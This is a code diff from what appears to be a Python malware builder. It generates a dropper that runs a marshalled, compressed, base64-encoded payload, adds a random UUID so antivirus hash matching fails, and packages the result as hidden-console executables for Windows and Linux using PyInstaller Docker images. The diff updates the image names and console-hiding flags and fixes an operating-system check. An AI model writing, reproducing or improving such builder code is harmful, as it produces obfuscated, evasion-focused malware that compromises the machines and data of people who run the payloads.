@@ -166,8 +166,6 @@ create_moduel(url+"client/client.py").run(url, file_path)"""
             
         dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,geocoder,requests,importlib.util
 from urllib.request import urlopen
-from discord import Embed
-urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
 exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.compress(marshal.dumps(payload,2))))}))))
 #{uuid.uuid4()}"""
         #this will prevent anti-viruses from looking for hashes of the script
@@ -175,17 +173,18 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
         with open(f"{payload_file_name}.py", 'w') as f:
             f.writelines(dropper)
-        
+
 
         if os_name == "Windows":
-            result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows "pyinstaller -F --noconsole {payload_file_name}.py"', shell=True, capture_output=True)
-            print(result)
+            result = subprocess.run(f'docker run -v "$(pwd):/src/" batonogov/pyinstaller-windows pyinstaller -F --hide-console hide-early {payload_file_name}.py', shell=True, capture_output=True)
+            print(result.stdout.decode(), result.stderr.decode())  # Print output for debugging
             shutil.copy(f"dist/{payload_file_name}.exe", f"payloads/{payload_file_name}.exe")
 
-        elif os_name == "Darwin" or "Linux":
-            result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-linux "pyinstaller -F --noconsole {payload_file_name}.py"', shell=True, capture_output=True)
-            print(result)
+        elif os_name == "Darwin" or os_name == "Linux":
+            result = subprocess.run(f'docker run -v "$(pwd):/src/" batonogov/pyinstaller-linux pyinstaller -F --hide-console hide-early {payload_file_name}.py', shell=True, capture_output=True)
+            print(result.stdout.decode(), result.stderr.decode())  # Print output for debugging
             shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")
+
 
         os.remove(f"{payload_file_name}.py")
         os.remove(f"{payload_file_name}.spec")
